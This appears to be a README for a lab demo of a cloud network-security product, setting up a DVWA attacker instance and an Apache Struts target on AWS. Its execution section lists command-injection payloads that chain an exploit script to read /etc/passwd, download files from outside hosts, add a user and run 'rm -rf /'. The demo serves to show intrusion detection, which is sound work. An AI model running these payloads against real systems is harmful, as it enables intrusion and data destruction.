# Cloud One - Network Security Demo
Requirements:

-- AWS Account
-- NSVA Deployment (Terraform)
-- 2 Ubuntu Linux Instances

## Phase1 - Demo Preparation
- Create 2 new Linux Instances;
- On the Advanced Options field, paste the script attacker-dvwas.sh and target-apachestruts.sh (1 script in each instance);

## Phase2 - Testing the Demo
- Connect on the Linux Instance where you executed the attacker-dvwa-ds script through http://public-ip

-- username: administrator 
-- password: password

- Connect on the Linux Instance where you executed the target-apachestruts-ds script through http://public-ip

## Phase3 - Executing the Demo
- Command Injection Menu
-- Use the "Ping" field to execute the attacks below:
- 127.0.0.1| python http://target-ip/hello "command"
- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
- 127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
- 127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
- 127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
- 127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
- 127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
- 127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"

## Phase3 - SMS/C1NS Logs
Check the logs

.

